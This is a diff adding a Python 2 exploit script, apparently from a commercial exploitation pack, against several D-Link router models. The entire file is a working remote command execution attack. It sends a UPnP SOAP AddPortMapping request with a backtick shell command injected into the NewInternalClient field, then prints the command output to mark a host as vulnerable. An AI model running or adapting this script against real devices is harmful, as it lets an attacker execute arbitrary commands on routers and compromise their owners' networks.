@@ -1,0 +1,69 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2014
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_dlink_14'
+_vendor_ = 'd-link'
+_model_  = ['DIR-300, DIR-600, DIR-645, DIR-845, DIR-865']
+_vuln_   = 'UPnP SOAP OS Remote Command Execution'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    content = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s/soap.cgi?service=WANIPConn1'%host)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.setopt(pycurl.HTTPHEADER, ['SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"'])
+    c.setopt(pycurl.HTTPHEADER, ['Content-Type: text/xml'])
+    datapost = """<?xml version="1.0"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+<SOAP-ENV:Body>
+<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
+<NewPortMappingDescription></NewPortMappingDescription>
+<NewLeaseDuration></NewLeaseDuration>
+<NewInternalClient>`uname -a`</NewInternalClient>
+<NewEnabled>1</NewEnabled>
+<NewExternalPort>634</NewExternalPort>
+<NewRemoteHost></NewRemoteHost>
+<NewProtocol>TCP</NewProtocol>
+<NewInternalPort>45</NewInternalPort>
+</m:AddPortMapping>
+</SOAP-ENV:Body>
+</SOAP-ENV:Envelope>"""
+    c.setopt(pycurl.POSTFIELDS, datapost)
+    c.setopt(pycurl.POST, 1)
+    c.setopt(c.TIMEOUT, 15)
+    c.setopt(pycurl.WRITEFUNCTION, content.write)
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  data = content.getvalue()
+  content.close()
+  if 'Linux' in data:
+    print '[+] %s vulnerable:' % host
+    print '%s' % data
+  else:
+    print '[+] %s not vulnerable' % host
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
